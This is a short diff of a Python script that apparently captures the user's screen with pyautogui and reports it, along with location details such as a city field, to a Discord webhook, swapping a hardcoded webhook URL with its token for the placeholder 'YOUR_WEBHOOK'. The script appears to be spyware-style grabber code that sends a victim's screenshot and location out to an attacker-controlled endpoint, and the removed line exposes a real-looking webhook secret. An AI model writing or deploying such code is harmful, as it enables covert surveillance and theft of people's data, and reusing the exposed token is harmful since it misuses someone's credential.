@@ -3,7 +3,7 @@ import pyautogui
 import socket
 import urllib.request
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1471977188919214131/6WMyy-7UQdfBImiyYGbNDmuSrTUkg8bldzJyrwaTCV6uUR5TmlNw7DBJodVcJmWQEc3R"
+WEBHOOK_URL = "YOUR_WEBHOOK"
 
 screenshot = pyautogui.screenshot()
 screenshot.save("screen.png")
@@ -55,3 +55,4 @@ City 🌍:
 
 
 exit(5)
+
